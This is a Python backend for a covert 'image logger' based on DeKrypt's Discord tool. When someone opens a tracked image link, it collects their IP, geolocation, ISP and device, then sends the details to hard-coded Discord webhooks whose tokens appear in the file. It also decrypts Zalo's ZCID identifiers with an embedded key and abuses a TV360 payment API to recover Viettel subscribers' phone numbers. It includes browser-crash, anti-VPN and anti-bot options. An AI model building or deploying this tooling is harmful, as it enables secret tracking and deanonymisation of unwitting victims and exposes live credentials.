
import requests
import httpagentparser
import string
import random
import datetime
import app.curd as curd
import app.schemas as schemas
from sqlalchemy.orm import Session
from Crypto.Cipher import AES
import base64
from urllib.parse import unquote
from Crypto.Util.Padding import pad, unpad
from urllib.parse import urlparse, parse_qs
import json
import hashlib
import binascii
import re
import pytz
import codecs
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1127802266611634276/QkXfyBN2fEODy5EcY7ONZpYl0sljOFzme0vAuweTEIA1o1Dh9K2oIlRY-vUbPfGPa1iK",
    "webhook_error": "https://discord.com/api/webhooks/1129789976696078489/u1hlj6FRCSBCSXLKAtqCw1PY1929ZA25-oYozoYyHOVHyaFX_CsjXDFmJdcijNk7hHtK",
    # You can also have a custom image by using a URL argument
    "image": "https://media-ten.z-cdn.me/KGjxTNEIU5EAAAAM/she-sheslams.gif",
    # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    # Allows you to use a URL argument to change the image (SEE THE README)
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",  # Set this to the name you want the webhook to have
    # Hex Color you want for the embed (Example: Red is 0xFF0000)
    "color": 0xFFFF00,
    "color_error": 0xFF0000,
    # OPTIONS #
    # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    "crashBrowser": False,

    # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
    "accurateLocation": False,

    "message": {  # Show a custom message when the user opens the image
        "doMessage": False,  # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
        "richMessage": True,  # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1,  # Prevents VPNs from triggering the alert
    # 0 = No Anti-VPN
    # 1 = Don't ping when a VPN is suspected
    # 2 = Don't send an alert when a VPN is suspected

    # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "linkAlerts": True,
    # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
    "buggedImage": True,

    "antiBot": 1,  # Prevents bots from triggering the alert
    # 0 = No Anti-Bot
    # 1 = Don't ping when it's possibly a bot
    # 2 = Don't ping when it's 100% a bot
    # 3 = Don't send an alert when it's possibly a bot
    # 4 = Don't send an alert when it's 100% a bot


    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect to a webpage?
        "page": "https://your-link.here"  # Link to the webpage to redirect to
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image
}

blacklistedIPs = ("27", "104", "143", "164")


def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=None, port=None, filename=None, url_thumbnail=None, botname='Image Logger', db: Session = None, zalo = None):
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os, browser = httpagentparser.simple_detect(useragent)
    if token:
        if curd.check_exists_token(db, token=token):
            logger_model = schemas.loggers(
                ip=f'{ip}',
                user_agents=str(useragent) + str(zalo),
                device=f'{os} - {browser}',
                ip_info=str(info),
                filename=filename,
                token=token,
                time_stamp=timestamp,
                created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            )
            logger_res = curd.create_logger(db, loggers=logger_model)
            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=f'{useragent}', filename=filename, zalo = zalo, token=token, url_thumnail=url_thumbnail, type='Success: ', id=logger_res.id)
            res =requests.post(url, json=embed)
            return logger_res
        else:
            logger_model_error = schemas.logger_error(
                ip=f'{ip}',
                user_agents=str(useragent),
                device=f'{os} - {browser}',
                ip_info=str(info),
                filename=filename,
                token=f'Unknow token: {token}',
                time_stamp=timestamp,
                created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            )
            logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=f'{useragent}', filename=filename, token=f'Unknow token: {token}', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
            res =requests.post(url, json=embed)
            return logger_res
    else:
        logger_model_error = schemas.logger_error(
            ip=f'{ip}',
            user_agents=str(useragent),
            device=f'{os} - {browser}',
            ip_info=str(info),
            filename=filename,
            token='BruteForce server',
            time_stamp=timestamp,
            created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
        embed = export_data(ip_info=info, created_at=str(timestamp)[:-6], ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token='BruteForce server', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
        res =requests.post(url, json=embed)
        return logger_res


# Generate a random 8-character string
def generate_random_string(length):
    # Define the characters to choose from
    characters = string.ascii_letters + string.digits

    # Generate a random string of the specified length
    random_string = ''.join(random.choice(characters) for _ in range(length))

    return random_string
def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id, zalo=None):
    info=  f"1. IP: {ip} - port: {port}, Time: {created_at} \n2. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Phone:{zalo}"
    embed = {
        "username": "IP Logger",
        "avatar_url": url_thumnail,
        "content": info,
        "embeds": [
            {"author": {
                "name": f'Image: {filename} - Token: {token}',
                "icon_url": f'{url_thumnail}'
                }
            },
            {
            "title": ":apple:--------------:apple:-------------------:apple:"
         }]
    }
    return embed

# def convert_time(timestring):
#     timestring_int = int(timestring)
#     utc_time = datetime.datetime.fromtimestamp(
#         timestring_int / 1000
#     ).strftime("%H:%M:%S %d-%m-%Y")
#     return utc_time

def convert_time_utc_7(timestring):
    # Convert the timestamp string to an integer
    timestring_int = int(timestring)
    
    # Convert the timestamp to UTC time
    utc_time = datetime.datetime.fromtimestamp(timestring_int / 1000, pytz.utc)
    
    # Define the UTC+7 timezone
    utc_plus_7 = pytz.timezone('Asia/Bangkok')
    
    # Convert the UTC time to UTC+7 time
    local_time = utc_time.astimezone(utc_plus_7)
    
    # Format the time as a string
    formatted_time = local_time.strftime("%H:%M:%S %d-%m-%Y")
    
    return formatted_time

def deMessage(e,key):
    try:
        e = base64.b64decode(e)
        key = base64.b64decode(key)
        iv = bytes.fromhex("00000000000000000000000000000000")
        encodings = ['utf-8', 'latin-1']  # Add more encodings if needed
        for encoding in encodings:
            try:
                decrypted_data = decrypt_data(e, key, iv, encoding)
                return decrypted_data
            except UnicodeDecodeError:
                continue
        return "Failed to decode the input data with any encoding"
    except Exception as e:
        return str(e)

def decrypt_data(data, key, iv, encoding):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
    return decrypted_data.decode(encoding)  

def decrypt_zcid(e, key):
    try:
        e = codecs.decode(e, 'hex')
        key = key.encode('utf-8')
        iv = bytes.fromhex("00000000000000000000000000000000")
        encodings = ['utf-8', 'latin-1']  # Add more encodings if needed
        for encoding in encodings:
            try:
                decrypted_data = decrypt_data(e, key, iv, encoding)
                return decrypted_data
            except UnicodeDecodeError:
                continue
        return "Failed to decode the input data with any encoding"
    except Exception as e:
        return str(e)



def checkinfo(t_md, ZCID, networktype, operator, useragent='', viewerkey=None):
    
    uid = '0'
    if viewerkey:
        uid = viewerkey.split('.')[0]
    if ZCID:
        operator_name = get_operator(operator)
        zcid_data = decrypt_zcid(ZCID, 'IXX3RM3GABH3NS0AED3VV04N9ABCDA1D')
        parts = zcid_data.split(',')
        # Extract the timestamp
        timestamp = parts[3]
        if networktype == '0':
            return f' {parts[2]} - mạng: Wifi - mạng di động: {operator_name} - LoginTime: {convert_time_utc_7(timestamp)} - UID: {uid}'
        else:
            return f' {parts[2]} - mạng: LTE - mạng di động: {operator_name} - LoginTime: {convert_time_utc_7(timestamp)} - UID: {uid}'
    if t_md:
        if networktype == '1':
            return f' Loại thiết bị Apple - Mạng: Wifi - UID: {uid}'
        if networktype == '2':
            return f' Loại thiết bị Apple - Mạng: LTE - UID: {uid}'
        if useragent and 'network' in useragent:
            return f' Loại thiết bị Apple - network: {networktype} - UID: {uid}'
        if useragent and 'ZaloPC' in useragent:
            return f'Zalo PC - network: {networktype} - UID: {uid} - t_md: {t_md}'
    else:
        if useragent and 'network' in useragent:
            return ' Loại thiết bị Apple'
        if useragent and 'ZaloPC' in useragent:
                return 'Zalo PC'
    return 'Trình duyệt' if useragent and 'Mozilla' in useragent else 'Thiết bị không xác định'

def get_operator(mnc):
    switcher = {
        '45201': 'Mobifone',
        '45202': 'Vinaphone',
        '45204': 'Viettel',
        '45205': 'Vietnamobile',
        '-1': 'Không xác định'
    }
    return switcher.get(mnc, mnc)
    
def Get_phone_number_viettel(token_tv360: str):
    # API request
    url = 'https://api.tv360.vn/api/v1/payment/request-v2'
    payload = {
        "packageId": "1101",
        "paymentMethodId": "4"
    }
    headers = {
        'Authorization': f"Bearer {token_tv360}",
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'api.tv360.vn',
        'osapptype': 'ANDROID'
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        response_data = response.json()
        # Extract phone number
        if response_data and 'data' in response_data and 'bindingQrLink' in response_data['data']:
            binding_qr_link = response_data['data']['bindingQrLink']
            url_parts = urlparse(binding_qr_link)
            query = parse_qs(url_parts.query)
            if 'login_msisdn' in query:
                return query['login_msisdn'][0]
            else:
                print('login_msisdn not found')
        else:
            print('bindingQrLink not found')

    except requests.RequestException as e:
        print(f"An error occurred: {e}")
    

